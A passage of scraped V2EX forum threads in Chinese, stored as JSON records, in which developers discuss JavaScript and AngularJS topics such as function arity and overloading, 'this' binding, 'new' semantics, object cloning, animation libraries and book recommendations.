"定义时括号中指定了三个参数，那么这个函数的 arity 就是三。\r", "\r", "tj 代码中常通过 arity 来给不同回调。刚才说到的 superagent，如果回调的 arity ==1 就 callback(response); 如果是 2 或以上，就照 node 的惯例 callback(err, response)\r", "\r", "express 中也是，middleware arity 如果是 3 或一下，就是 middleware(req, res, next); 这样，而如果是 4 或以上就说明它是一个处理错误的 middleware，这样去调用 middleware(err, req, res, next)\r", "\r", "\r", "我觉得根据 arity 来做不同反应真不算是优雅的解决方案。", "以上两个是搞 JS 的时候比较烦的两点。有一些相关性，吐槽一下，也想听听大家的意见。", "这是一个折中方案，要保持public API简单轻量灵活，如果不喜欢这种风格，可以拆出几个public API", "也有很多解决这类问题的库，比如这个 ", "\r", "之前也想自己整个，但感觉实现起来都不是很优雅", "个人感觉可以自己封装一个，然后用 sweet.js 实现一个自建语法，最后走 grunt 编译，调试走sourcemap，语法校验的话只要别太离谱就ok，这样来到是比较好的解决办法", "弱类型谈什么重载?\r", "\r", "如果需要对参数类型进行匹配, 在函数中进行分发这是常见的做法, 该这么做就这么做.\r", "\r", "见 $()", " 我也这么认为", "有的库的接口这样做是为了保持api的简洁，这样从使用者看来会觉得好像它一个函数啥都能干。然后用的人会觉得简洁，利于库的推广和传播\r", "\r", "平常开发的时候参数一多，用对象做参数就ok了，那种代码里面重载的方式我只能说读起来虐心，写起来估计也虐心，尽量少用的好", "楼主去看看 jquery 的入口函数吧", "不能重载有一定原因吧！假如能重载\r", "var foo = function(){};\r", "var foo = function(arg){};\r", "这种定义函数的方式就不行了。", "function request(url,options) {\r", "options = options || {};\r", "var method = options.method || 'GET'\r", "if(options.callback){\r", "    return new Request(method,url).end(options.callback);\r", "} else {\r", "    return new Request(method,url);\r", "}\r", "}\r", "个人觉得这个函数应该这么写。\r", "这函数，返回的可能end了也可能没有，很糟糕的设计个人觉得", "实际上url这种强制的参数应该放在前面，楼主的这个最大的问题其实就是url可能跑到method上，这样就很乱", "所以我建议传参用 Object，\r", "\r", "request({\r", "    url   :\"http://google.com\",\r", "    method:\"POST\",\r", "    callback:callback\r", "})", "js 就是传Object比较好吧，习惯就好", "函数的重载 可以自己 模拟方法", " 正解，又不是 C++/Java"]},
{"content": "", "reply": "19", "tittle": "介绍“jQuery 各功能的原生实现”的文章或页面？", "comment": ["V2EX 这种地方肯定会有人跳出来说 RTFS 的吧，风气啊。。。", "你不会想用原生实现的，我肯定。", " read the f*king what?\r", "\r", " 偏偏我是那种盲目崇拜原生的", " 好像是read the f**king source\r", "\r", "那么我就是因为找不到source才问的你以为我想找喷啊……", " 除非你不需要接触IE，否则再崇拜也无奈", " 然后偏偏我也是盲目排斥IE的\r", "\r", "好吧，不钻牛角尖了\r", "\r", "拜托不管怎样有就给我好不好……这样一句一句地接不累嘛哥", "Jquery 应该有很多人写过, Google 第一页就能够找到很多.\r", "如果你喜欢写原生的话可以看 Qatrix 简单/易懂比较实用, 其实我写过 Qatrix 的注释.. 不过还是不拿出来献丑了..", " Qatrix 我也挺喜欢，问这个只是了解一下。\r", "(我才不会说这是我以前见到过还收藏过结果找不到了只好问……", " 要不我们去 Github 戳个项目, 每天注释一段?", " 原来好像有个做项目注释的，可以加入他们", " 这个我留意过, 但他们好像没有新版的计划, 即使 pull 也没有意思接受的样子.", "阿里有人写了本介绍jQuery源码的书，《jQuery技术内幕》。\r", "感觉挺不错的", "直接看源码不就完了", " 都是开源的你说你找不到源码？这里不就是吗 ", " 模块都给你分好了，想学习哪块就看哪块，注释也写得清清楚楚，除非你不想看英文的，那你就应该说明要找中文的啊啊啊啊啊", "敢说说为什么用原生吗？高端上档次？", "楼主拿去，不谢\r", "原生还是要学的，特别是前端，大公司招人指明了要原生的", " 另起炉灶？\r", " @", " 傻逼了没想到看实现 其实是原来看到过这种东西结果忘了\r", " 宗教信仰", "直接读源代码就是了啊。。。"]},
{"content": ["<div class=\"topic_content\">如题。<br>在做一个多人连续输入信息最后登录的一个操作。<br>每一个人需要输入姓名，年龄等信息(触摸屏用:这些均为单独页面)，并在页头中间显示第几个人。<br>在页头上还有一个 [返回] 按钮，点击后执行history.back()。<br>假设到第三个人时，想 [返回] 到第一个人的输入界面，<br> [返回] 到第二个人，第一个人的输入页面时，输入页面的页头中显示为第三个人，<br>而不是第二个人，第一个人(并不是所有的都显示第三个人，有的正常显示)。</div>"], "reply": "目前尚无回", "tittle": "浏览器的返回按钮功能(history.back) 为什么历史页面内容被修改", "comment": []},
{"content": ["<div class=\"topic_content\">&lt;tbody ng-repeat=\"xxx\"&gt;<br>__&lt;tr ng-repeat=\"xxx\"&gt;<br><br>...<br><br>虽然2个repeat，但是数据很少，才4个，半天都不显示边框线。但是在table后加一个&lt;br/&gt;就正常。是什么导致渲染迟缓</div>", "<div class=\"topic_content\">就是表格最下面的边框要很久才显示，在表格后面加一个br标签就正常，话说这是技术提问，怎么变成了争吵，而且与我的主题无关。angular可能不如其他框架好，但是我问的这部分绝对跟性能无关，因为我都说了，数据量是很少的。</div>", "<div class=\"topic_content\">就是表格最下面的边框要很久才显示，在表格后面加一个br标签就正常，话说这是技术提问，怎么变成了争吵，而且与我的主题无关。angular可能不如其他框架好，但是我问的这部分绝对跟性能无关，因为我都说了，数据量是很少的。</div>"], "reply": "22", "tittle": "Angular 动态生成表格，为什么边边很慢才显示。", "comment": ["放弃angularjs吧，我是来黑angular的", "现在的人问代码问题怎么都补贴代码？", "不贴代码", " 那就是代码。json就4个项，不用写这么仔细吧。", "单元格这么少，应该不是 angular 的问题\r", "\r", "具体是什么情况呢？是页面其他部分都显示出来了只有这个表给没显示出来吗？\r", "另外，你说“不显示边框线”，是单元格的内容出现了，只有边框线没出现吗？", "弱弱的问一句，你为什么要repeat tbody？？？", " 说说为什么要黑ng？", "想起来以前 ", " 这个贴不少人说性能不重要不是大问题...", " 性能差，浏览器兼容差，架构也不怎么样，做些简单小应用效率还行，一旦项目复杂需求特殊的话，angular可以弄得很麻烦。另外把项目迁移到angular需要整个重写逻辑，万一angular以后如google wave一样黄了，再改用其他框架也是很麻烦的。所以一直不喜angular", "<tbody ng-repeat='item in [1,2,3,4]'>\r", "<tr ng-repeat='item in [1,2,3,4]'>\r", "\r", "有什么问题？@coolicer", " 同黑，见angularjs一次黑一次", " 谷歌每推出一项新技术都声称革命性，如楼上 @", "  所说，当年wave也是声称革email的命，革着革着就没下文了。golang先是号称系统级语言革c语言的命，发现c语言这个硬骨头咬不动就去咬ruby、python、java，跟C语言比开发效率，跟ruby比运行效率，跟java比轻便。\r", "\r", "angularjs，没错，又是个革命性的创新，这次革命的矛头对准的是jquery，像一个破坏人家庭的小三：“我和jquery你只能选一个”，忽悠了一群码农退jquery保平安", " 你这种无脑黑真低端啊…先查查资料再来喷也来得及的", "同上", "Angular就是性能差一些，代码调用乱一些，维护起来恶心一些，做些简单的CRUD表单应用还是非常有效率的啊。", " \r", " \r", "\r", "对啊 貌似应该是\r", "<tr ng-repeat='row in rows'>\r", "<td ng-repeat='cell in row'>\r", "才对来着吧?", " +1", "高性能看这里：\r", "\r", "\r", "上面黑ng性能的，提供一些非ng实现的高性能例子呢", "LZ 用的什么浏览器？\r", "我在 chrome 下试试没发现什么问题。\r", " \r", " 我觉得ng跟wave或者google reader没有可比性，ng是开源框架，而wave，reader是google的产品，这明显不一样样啊。而且就算哪天gg不维护ng了，社区可以马上fork出一个来\r", "另外性能问题在未来有了observer完全不是问题\r", "兼容性问题，完全就是程序员纵容了用户，君不见微信网页版，人人网v7都不支持67的\r", "但有些网站（比如qq首页），在6，7下竟然连个升级提示都没有，你说不是程序员（产品狗？）纵容用户是什么", " 这个问题是在所有浏览器下都这样吗？\r", "只是最下面的边框不显示的话，会不会是 css 问题或者某些浏览器的 bug 之类的？\r", "\r", "感觉还有可能是表格下面的某个元素在页面初始化时因为某些原因把表格最下方给挡住了，导致下面的边框没显示，在页面不断渲染的过程中，它的位置往下去了，边框就又显示了出来。造成了边框渲染缓慢的假象。\r", "加<br>后把下面那个元素给顶下去了，所以就不再出现这个问题", "题主你说你为毛不给个jsbin或者其它什么的链接。。。。\r", "给段看都看不清的代码，让人怎么给你解决问题。。。。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://blog.brunoscopelliti.com/deal-with-users-authentication-in-an-angularjs-web-app\" rel=\"nofollow\">http://blog.brunoscopelliti.com/deal-with-users-authentication-in-an-angularjs-web-app</a><br><br><a target=\"_blank\" href=\"https://medium.com/opinionated-angularjs/7bbf0346acec\" rel=\"nofollow\">https://medium.com/opinionated-angularjs/7bbf0346acec</a><br><br><a target=\"_blank\" href=\"http://frederiknakstad.com/2013/01/21/authentication-in-single-page-applications-with-angular-js/\" rel=\"nofollow\">http://frederiknakstad.com/2013/01/21/authentication-in-single-page-applications-with-angular-js/</a><br><br><a target=\"_blank\" href=\"https://github.com/mrgamer/angular-login-example\" rel=\"nofollow\">https://github.com/mrgamer/angular-login-example</a><br><br><a target=\"_blank\" href=\"http://arthur.gonigberg.com/2013/06/29/angularjs-role-based-auth/\" rel=\"nofollow\">http://arthur.gonigberg.com/2013/06/29/angularjs-role-based-auth/</a><br><br><a target=\"_blank\" href=\"http://beletsky.net/2013/11/simple-authentication-in-angular-dot-js-app.html\" rel=\"nofollow\">http://beletsky.net/2013/11/simple-authentication-in-angular-dot-js-app.html</a><br><br>请叫我红领金<br><br>今晚回去看</div>"], "reply": "6", "tittle": "有关 Angular 登录的，找到了一些资源。", "comment": ["看来我的方法好暴力（", "先mark，现在啥也不想看了。", "下午还想问有没有Angular的Best practice来着。", "这个要看服务器对认证是怎么做的才能有对应的方式吧", "mark", "感觉第二个不错，写得很详细"]},
{"content": ["<div class=\"topic_content\">由于日常项目中，经常要做一些javascript效果，用jQuery当然很方便，但是又不想为了一点效果去引入jQuery这么大一个lib，之前也尝试过使用jQuery custom之类的第三方库，但感觉还是蛮大的。于是自己稍微加工整理了一个。<br><br>项目地址： <a target=\"_blank\" href=\"https://github.com/ikitty/TGcommon\" rel=\"nofollow\">https://github.com/ikitty/TGcommon</a> <br><br>如果能给同样需求的同学带来方便，那真是太好了。欢迎您的各种建议哈。</div>"], "reply": "11", "tittle": "分享一个简单的 Javascript 函数库 TGcommon", "comment": ["赞。  不过命名风格略奇怪。", " 命名风格奇怪？求详解。我可以改进下", " 为什么叫 TGcommon，为什么不是 TGCommon，或者 tgCommon，缩短一点叫 tg，也好。", "感谢楼主分享，顺便也介绍个好玩的，用原生JS实现大部分jQuery方法http://youmightnotneedjquery.com/", "addClass，removeClass可以直接调用classList上的方法。IE8+ 效率会更高！", " soka, 说的在理。应该用TGCommon的，TG是我们团队名称哈。其实个人是非常喜欢和推崇驼峰命名的", " zepto是非常优秀的。由于我们还有10%以上的用户还在使用IE6，所以还是得照顾着。\r", "如果是care现代浏览器，zepto还是非常棒的选择", " \r", " nice，两位的建议都很不错，在现代浏览器中，有些方法可以直接调用原生的，效率更赞。thanks", "叫TG的团队真不怕哪天就给墙了吗哈哈哈……现在jQuery可以自定义了，只取需要的功能会小不少（虽然确实还是大）", " 哈哈，感谢lily哥（灰哥）。恩，还有个jquip也是把jQuery打散成几个可供选择的小部件的： "]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://julian.com/research/velocity/\" rel=\"nofollow\">http://julian.com/research/velocity/</a></div>"], "reply": "5", "tittle": "Velocity.js", "comment": ["不用WebGL?纯DOM实现的3D？", "看到背景图的一瞬, 差点以为自己显示屏坏掉了..", "看了这个DEMO ", " 感觉性能不佳啊\r", "\r", " ", " 怎么看的这个性能", " 看 chrome developer tools 里的 timeline 。\r", "\r", " "]},
{"content": ["<div class=\"topic_content\"><script src=\"https://gist.github.com/mopig/ba7fe3aef182e083806e.js\"></script><br><br>搞不懂 bind 前面的 this 和后边的 this 各指向的对象.<br><br>stackoverflow 上边看到的一段代码...</div>"], "reply": "9", "tittle": "关于 this 的指向, 很是疑惑啊 %>_<%", "comment": ["看不懂可以把this存到一个变量里例如，var _this = this。", "两个this都是同一个对象，就是以new调用MyObject时返回的实例对象。\r", "\r", "添加事件处理函数时，当前作用域会丢失（即this会指向全局对象），因此这里要把this.onClick绑定回当前的this中。\r", "\r", "还有一种会丢失作用域的情况是定时函数，所以如果想保存原来的上下文，同样需要为定时函数添加this绑定。", "很多时候主要是代码运行的环境不一样导致this的指向变了，比如onclick执行的时候不是在你代码运行的时候而是你点击的时候。", " 谢谢\r", "\r", " 解释很清楚, 太感谢了", " 哦，在看不懂的情况话，我就会将this对象赋给一个变量，供之后使用", " 一般this会丢失的情况就几种，闭包里，还有就是事件处理函数和定时函数，其他情况下不怎么需要保存这个this", "尽量避免用", "之前正好写了一篇关于this指向的文章 ", "\r", "\r", "比起解释this，更多的是教你看ecma标准，希望对你有帮助", " 哦，比如经常在ajax传数据的时候用这种方法"]},
{"content": ["<div class=\"topic_content\">请问何谓深clone, 何为浅clone?</div>"], "reply": "2", "tittle": "javascript 对象 clone 问题", "comment": ["clone一般是copy属性，对于值为引用类型（对象、数组等）的属性，浅clone只是复制引用，深clone会再继续进行迭代复制。", "   供参考"]},
{"content": "", "reply": "1", "tittle": "请问大家知不知道 Mac 上有什么可以看 javascript 代码并支持方法函数跳转的应用", "comment": ["webstorm，以前用过，很强悍的ide，现在用vim"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://codegolf.stackexchange.com/questions/28821/regex-that-only-matches-itself/31863#31863\" rel=\"nofollow\">http://codegolf.stackexchange.com/questions/28821/regex-that-only-matches-itself/31863#31863</a></div>"], "reply": "目前尚无回", "tittle": "Regex that only matches itself", "comment": []},
{"content": ["<div class=\"topic_content\">目前已知sencha，JM，Gmu，希望API比较全，组件丰富的兼容性好</div>"], "reply": "目前尚无回", "tittle": "求推荐移动 web 开发框架", "comment": []},
{"content": ["<div class=\"topic_content\">学习学习。</div>"], "reply": "6", "tittle": "github 或者其他地方有没有 Angular+phonegap 做的开源项目", "comment": ["ionic framework", "同楼上，贴个链接\r", "用ionic做过一个app.这个框架理念很好，但是还不成熟，坑非常多。", " ", "\r", "刚贡献了一下 ＝。＝", "最近也在玩这个，看youtube上的视频模仿了一个，用ionic写的，https://github.com/keith3/TodoApp，\r", "\r", "ionic, cordova, phonegap都试了一下，如果是自己写着玩的话可以用ionic，否则不推荐用，虽说在ui方面给你省了很多事，但是毕竟还太不成熟，截了个图，按钮边缘各种毛刺（怎么形容。。），反正很多地方会出现这种情况，渲染的很不好，", " 挺坑的，边边怎么能这样。是卡通风格吗？"]},
{"content": "", "reply": "10", "tittle": "求 js 的书推荐。。。。", "comment": ["去知乎搜。\r", "不要买中国人写的JS书，谨记。", "蝴蝶书，乌龟书，猫头鹰书（我觉得犀牛书很必要，就是太厚了，会吓跑一部分人）。", "Javascript the good parts", "Secrets of the JavaScript Ninja, jQuery 作者写的", "蝴蝶书： ", "\r", "乌龟书： ", "\r", "猫头鹰书： ", "\r", "犀牛书： ", " 不看一本厚书能看懂 TGP ？", "MDN", "javascript 高级程序设计和蝴蝶书.", "JavaScript DOM 编程艺术", "《JavaScript编程实战》这本书是新出的，挺赞的，我很喜欢"]},
{"content": ["<div class=\"topic_content\">目前都是有用于简单的转换，比如把数字转成代表的意思。今天写了一个filter有20来个if，因为真的有这么多种情况。感觉要循环很多很多次（事实上没有感觉到慢，做好以后也是局域网的），但是这样写真的方便。</div>"], "reply": "6", "tittle": "Angular，我是不是应该少用 Filter？", "comment": ["我觉得是 整理一下这个filter的 业务逻辑比较好", "20个if？不如写 20 个 filter", " 什么意思。像有10来个数字，一种代表一个类型，然后还有一个子类型。\r", "\r", "像类型为10的，里面有1，2个子类型。难道不用去判断？写成20个filter，我不知道怎么写。", "  不知道具体业务如何，但是 20 个 if 一定是可以优化的。", "20 来个……\r", "switch 也比 if else 好啊", "直接用字典啊，数字 => function"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://trevorlinton.github.io/\" rel=\"nofollow\">http://trevorlinton.github.io/</a><br><br>一个完全用 JavaScript 写的 web 渲染引擎。</div>"], "reply": "8", "tittle": "WebKit.js", "comment": ["蛋疼！", "厉害！", "造轮子是了解事物内部原理的途径之一", "我记得好像还有个用 JS 写的 vim", "想起来这个… ", "这个不是用纯js写的，是用emscripten从cpp转过来的，算是webkit的js binding.", "我只想严肃地对他说四个字：闲的蛋疼", "The live and death of JavaScript (读作Yava Script)"]},
{"content": ["<div class=\"topic_content\">在网上down了段HTML5的MP3播放器，但是暂停和播放是两个链接，我想问下怎么能整合成一个链接。<br>默认是暂停，点击一次变成播放，再点还是暂停，以此类推啊~~<br>&lt;a href=\"javascript:void(0);\" onclick=\"document.getElementById('player-audio').pause()\"&gt;Pause&lt;/a&gt;<br>&lt;a href=\"javascript:void(0);\" onclick=\"document.getElementById('player-audio').play()\"&gt;Play&lt;/a&gt;</div>"], "reply": "5", "tittle": "请问怎么把“暂停”和“播放”两个链接整合成一个啊？?", "comment": ["简单的toggle，自己维护一个局部变量就好", "五星级问题，坐等大神解答！", "我的理解中就是弄一个变量点一次就加1，判断是奇数还是偶数就醒了吧？", "class=\"play(or pause)\"\r", "\r", "if($('a').hasClass('play')){\r", "//pause\r", "pause();\r", "$(this).removeClass('play').addClass('pause');\r", "}\r", "....\r", "....\r", "...", "绑定一个函数\r", "<a href=\"javascript:void(0);\" onclick=\"musicPaused()\">Play</a>\r", "\r", " function musicPaused() {\r", "            var music = document.getElementById(\"clickMusic\");\r", "            if (clickMusic.paused) {\r", "                        clickMusic.play();\r", "                    }\r", "                    else {\r", "                        clickMusic.pause();\r", "                    }\r", "        }"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://bost.ocks.org/mike/algorithms/\" rel=\"nofollow\">http://bost.ocks.org/mike/algorithms/</a></div>"], "reply": "13", "tittle": "D3 is so cool", "comment": ["太帅了", "awesome!", "在 HN 上看到过，那个迷宫的深度优先算法视觉效果很碉堡。", "帅呆了", "大赞， 最近刚看完d3 cookbook", "fucking awesome", "Interactive Data Visualization for the Web ", "\r", "\r", "d3.js入门书，在线免费", "再今年的Eyeo听了Mike Bostock的演讲，这个就是他的演讲内容。如果大二的算法课都是这样教就好了。\r", "最近被这个玩意折腾死，公司入门要求搞定d3", "Bret Victor几篇文章之后看到的最mind-opening的文章，多谢分享！", "不好意思 \r", "请问D3是什么东西 是算法入门吗？ \r", "不要笑话我………………", " a popular open-source library for visualizing data using web standards. 在链接 ", " 上看到的", " 非常感谢！"]},
{"content": "", "reply": "26", "tittle": "JavaScript 中的 var 指的是什么？", "comment": ["variabel的缩写?", "variable!", "声明变量，不加关键字var产生的变量都将是全局变量，https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/var", "应该是名词variation，不是形容词\r", " \r", "能不能再水一点...", " 我学c语言就是完全看进口书学的。", "虽然知道楼主是初学者，但这个问题还是让人相当无语……", " \r", "variable 名词解释为 可变物， [数] 变量\r", "variation指变化，变动", " 他应该说的是这个词的全写说什么\r", "我觉得面试的时候，部分人还真会被难住", " 哪家公司面试考这个，你可以直接把简历扔在他脸上，让他去死。", "basic 里的 dim 又是啥呀", " 不懂现在的 Basic ，不过 dim 的第一感觉是 dimension", " ", "这是个哲学问题。。。", " ", " 哈，果然是 Dimension", " variable可以作名词啊。。变量的意思= =", "Make any sense?", "目测以后会出现什么是int，什么是const，什么是let（这个好像已经出现过了），什么是function（这个就没有简写好伐），什么是void，什么是“#”，什么是“.”，什么是C（++），什么是我，什么是你，什么是这个世界。", " 「function（这个就没有简写好伐)」\r", "\r", "func", "这个为什么没有移动到 pointless节点，还上了十大。", " \r", " \r", "\r", "Rust表示Go用func弱爆了, 我这直接用的fn.", "blocked.", "楼上的都正常点。\r", "\r", "\r", "var 声明一个变量。", "这个深入浅出js里讲过，所以我这个初学者知道。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://ww1.sinaimg.cn/mw690/9a46b2d4gw1ehzhl4zimdj20p30c7aaz.jpg\"><img src=\"http://ww1.sinaimg.cn/mw690/9a46b2d4gw1ehzhl4zimdj20p30c7aaz.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a></div>"], "reply": "19", "tittle": "当函数返回对象的时候, new func() 与 func() 效果是一样的么?", "comment": ["- - 貌似是一样的，但为什么这里要 new 呢 。。。", "this不一样了吧", "当然不一样。\r", "任何一本JS书里都写了 new 操作符做了什么事情。", "应用层面来说无本质区别，calculator 和 Calculator() 返回的对象是一样的", "首先，用new调用与不使用new调用的区别在于，前者会隐式返回一个实例，函数体内的this指向这个实例；\r", "\r", "但如果函数显式返回一个对象，那么new func()里面this的操作虽然还是针对实例对象，但返回的时候这个实例对象会被丢弃，new func()和func()的效果就是一样的。\r", "\r", "注意这里返回的必须是对象，如果return的是字符串或者Number，那就不会有效果，构造函数原来的行为会得到保留。\r", "\r", "参考： ", "完全一样", "举个例子\r", "var a = function(name) {\r", "  this.name = name;\r", "  console.log(this.name);\r", "  return {\r", "    sayName: function() {\r", "      console.log(this.name);\r", "    }\r", "  }\r", "}\r", "\r", "var A = new a(\"Jason\") //this指向实例，输出\"Jason\"；返回一个包含sayName方法的对象\r", "\r", "A.sayName(); //this指向全局，输出\"undefined\"", "缩进居然不支持……擦", "除非你是构造函数实例化一个对象，否则别用 new.\r", "如果你想让调用者可以省略new 关键字，可以这么搞：\r", "\r", "function Notice(msg, options) {\r", "  if (! (this instanceof Notice)) return new Notice(msg, options);\r", "\r", "这样有没有 new 调用 Notice 就完全一样了", "函数内部的this会不一样，抛开逻辑光从返回值上来说new和没有new是一样的了，比如\r", "\r", "function xx() {\r", "    return { x: 1 };\r", "}\r", "\r", "这样xx()和new xx()是完全一样的", "答案：一样的。可是这样写很容易引起困扰，因为它依赖一个硬性规定，就是如果构造函数返回了一个对象，那么这个对象会替代 new 操作符产生的对象而成为 new 对象创建表达式的值。所以，如果想把一个函数当成构造函数，就不要包含 return 语句。", "上面已经有人回答了，不一样。new过之后，this指向明显不一样。", " 答案", " 啥？", " 8樓的程序裏 A.sayName() 輸出 undefined 只是因爲a()返回對象的name屬性沒有值吧，this指向對象A。", "> var a = function(name) {\r", "... this.name = name;\r", "... console.log(this.name);\r", "... return {\r", "..... name: \"Tuzki\",\r", "..... sayName: function() {\r", "....... console.log(this.name);\r", "..... }\r", "... }\r", ". }\r", "undefined\r", "> var A = new a(\"Jason\")\r", "Jason\r", "undefined\r", "> A.sayName();\r", "Tuzki\r", "undefined\r", "> \r", "不影響結論，那個 name==\"Jason\" 的對象被丟棄了。", " 就是这样", "这是基础啊大哥\r", "有new时this指向新创建的对象\r", "没new时this指向global\r", "非要处理这种情况的话，一般的做法是\r", "function Class(){\r", "    if(this==window){// !this instanceof Class\r", "        return new Class();\r", "    }else{\r", "        init();\r", "    }\r", "}"]},
{"content": ["<div class=\"topic_content\">Angular 推出了 Material Design for AngularJS Apps <a target=\"_blank\" href=\"https://github.com/angular/material\" rel=\"nofollow\">https://github.com/angular/material</a></div>"], "reply": "2", "tittle": "Material Design for AngularJS Apps", "comment": ["前几天试用了一下 Polymer，感觉那个东西还很不成熟。\r", "这个 AngularJS Material 看起来靠谱多了，可以考虑在小项目里面试用一下。", "cooool"]},
{"content": ["<div class=\"topic_content\">最近看了Codrops的一篇文章, 里面讲到了一个页面切换的效果, 详情http://tympanus.net/codrops/2014/04/23/page-loading-effects/. 看了这个效果感觉很赞, 觉得这个效果可以用在angular的页面切换中, 所以将这个效果移植到angular中, 做成一个angular module, 方便以后添加类似效果时, 直接使用.<br><br>Github: <a target=\"_blank\" href=\"https://github.com/jeremial/me-pageloading\" rel=\"nofollow\">https://github.com/jeremial/me-pageloading</a><br><br>做好的demo效果<br><br>1. 配合 angular-ui-router使用, 效果http://isay.me/me-pageloading/angular-ui-router.html<br>2. 配合 angular-route使用, 效果http://isay.me/me-pageloading/angular-route.html<br><br>目前整个模块可以零配置工作, 但是由于angular-route的实现机制, `$routeChangeSuccess`在页面初始化后会触发两次, 因此会造成页面直接进入后就会触发一次效果. 这个问题可以通过禁用`me-pageloading`的自动加载解决.<br><br>在angular-ui-router中没有此问题.</div>"], "reply": "16", "tittle": "Angular 全局页面切换动画 me-pageloading", "comment": ["正在学习angular，赞一个。", "看起来好棒！", "动画效果都是毫无意义的，我觉得。", " \r", "我倒是觉得动画效果交互中的关键。动画效果对于提升用户体验有很大的帮助。Google 最近的 Material Design 也在动画上面下了很大功夫。", "Github 已 star，感谢已发送", "已star", "Cool~", " \r", " \r", " \r", " \r", "看了之后很有感觉, 所以就直接移植了", " 如果是为了用动画而用动画, 当然是没有意义的, 但是如果应该用的地方, 用对了动画, 对用户体验的提升就不是一点半点的了", " \r", " \r", "我看不出 windows 的过渡动画有什么意义，什么淡入淡出，进出都耗上500ms 直接慢了一秒，大大们不觉得吗？", " \r", "我想了一会都没想到... windows 哪些地方会有动画？\r", "\r", "如果放到 app/web app 上面去考虑，动画可以起到缓冲和引导用户的作用。\r", "你可以想想如果没有动画的话，当你向左/向右滑动的时候，侧边栏就是突然占据了画面的一部分位置，这会让人感到不适和困惑。\r", "\r", "你可以再想想，如果在 Android/iOS/WP 中把全部动画效果都移除的话，用户使用起来会怎样？（对于你来说可能没什么变化）\r", "\r", "如 @", " 所说，动画用在对的地方的话，可以很好的提升用户体验。\r", "\r", "现在的大部分产品都会去考虑用户体验的问题。如果你和你的竞争对手做的产品功能都是一样的，但是你的产品并没有考虑到用户体验，但竞争对手的产品却在用户体验升花了很多功夫，用户会更加倾向哪种产品？", " 手指滑动的动画这个需要。我只是认为，例如win的菜单显示，最大化最小化窗口，那些动画显然是多余的，瞬间显示所需内容比逐渐显示好，我认为这能提高我工作的效率，你不这样认为吗？", " \r", "刚才开虚拟机试了一下，嗯，windows下那样的粗糙的动画还不如直接去掉。看起来好不爽，好生硬的过度。这个可以当成一个动画用的不对的栗子吧", "好赞！CSS也有好玩的切换动画 ^^", "我要emberjs版。。。", " -_-! emberjs没看过啊... 只会angular"]},
{"content": ["<div class=\"topic_content\">animate.css经过很多css高手的贡献, 现在已经有很多的动画了. 如果能够在angular中使用这些动画, 将会非常美妙.<br><br>通过对angular-animate的学习, 可以尝试将animate.css上的动画移植到angular中, 使之能够按照angular的方式来使用.<br><br>通过观察, 可以知道, animate.css基本有两大类动画, 一类为入场和离场动画, 另一类则是可以重复执行的普通动画.<br><br>入场和离场动画,可以经过处理之后,变成angular-route或者angular-ui-router的过场动画.<br><br>而重复执行的动画, 则就可以作为angular中的普通动画, 重复执行.<br><br>本人制作的一个demo如下 <a target=\"_blank\" href=\"http://jeremial.github.io/me-animate.css\" rel=\"nofollow\">http://jeremial.github.io/me-animate.css</a><br>github地址: <a target=\"_blank\" href=\"https://github.com/jeremial/me-animate.css\" rel=\"nofollow\">https://github.com/jeremial/me-animate.css</a><br><br>欢迎大家感兴趣的一起来探讨.</div>"], "reply": "5", "tittle": "Angular.js 与 animate.css 集成", "comment": ["首页建议写 ng-bind,不用{{ }}。。\r", "\r", "动画库和angular结合在一起有什么特别的意义吗？", "有个也是基于animate.css的angular库\r", "赞一个，不过比较少用动画。", " 感谢指正, 以后会注意的.\r", "至于意义, 上面已经说过了, 可以按照angular的方式来使用这些动画\r", "\r", " 看到过这个, 但是自认为, ngFx添加一个新动画有些困难, 而且目前的动画数量不如animate.css中的多, 我这个说简单就是直接把animate.css拿过来处理一下而已, 所以animate.css中的所有动画都是包括在内的.", "IE7 飘过~"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://jsbin.com/kacufaxa/18/edit?html,output\" rel=\"nofollow\">http://jsbin.com/kacufaxa/18/edit?html,output</a></div>", "<div class=\"topic_content\">这个是修改过的 @<a href=\"/member/leavic\">leavic</a>     我知道我写的很烂，但是我就是喜欢写代码，我不相信有真爱，但我相信有奇迹。</div>", "<div class=\"topic_content\"><a target=\"_blank\" href=\"http://jsbin.com/vekoz/1/edit?html,output\" rel=\"nofollow\">http://jsbin.com/vekoz/1/edit?html,output</a></div>"], "reply": "37", "tittle": "学习 js 的处女作，忍不住让大伙看看。", "comment": ["我输入了11111111111，然后我的浏览器就卡死了。。。楼主你赔我浏览器！", "你也要陪我的", "=-=一样卡死了", "同上，我擦！", " 这，，实在是不好意思，已经修复了", "LZ没发现吗? if(f.value>1000) 这一句后面写得有问题啊...", "怎么输多少都会变成1000?", "if(f.value>1000) {var l=true;f.value=1000;}", "整个JS实现的思路有问题，也就是逻辑不对。", "楼主你赔我浏览器。", "我浏览器没死，结果对方 502 了，哈哈哈。\r", "\r", "还有逻辑真的不对。", "输入完1楼的数字没反映呀。", "好糟糕。。。", " ", "楼主萌萌哒, 待会回到家帮你写个好些的～", "来大神帮帮楼主，我随便打几个就变成1K了，无法改变", "变量名太萌了，不忍吐槽", "邏輯。。。\r", "改掉那個大括號問題的時候，還有s初始化的問題。", "变量名要取的恰到好处，foo、frm、f、e、s都是不合格的名字", " 话说我一开始是想知道怎么才能把表单的值存到变量里，后来别人告诉我onkeyup，结果就写来写去写出这么一坨。", " 对，要楼主赔一个一模一样的浏览器！", " 太好了，这对我很有，帮助。", " 明天再看看，谢谢。", " 谢谢，明天再想想。", " 练习，变量名就没多想", "ignorance is bliss", "今天到家比较晚呢.... \r", "扔一份编程风格给楼主, 至少统一一下吧... ", " 很简洁，不过暂时我练习基础的东西，这个先收藏了", "if(f.value>1000) var l=true;f.value=1000;\r", "\r", "楼主，我是坚持用{}的，不管后面是一句还是两句……", " 这个重写的，感觉很罗嗦  ", "要不咱学点别的吧", "有bug，一直是1000", "加油", "我感觉不能简单用isNaN来判断输入啊.", "我最近也在学js\r", "就在网上找了一些文档在看.\r", "楼主有什么建议么??", 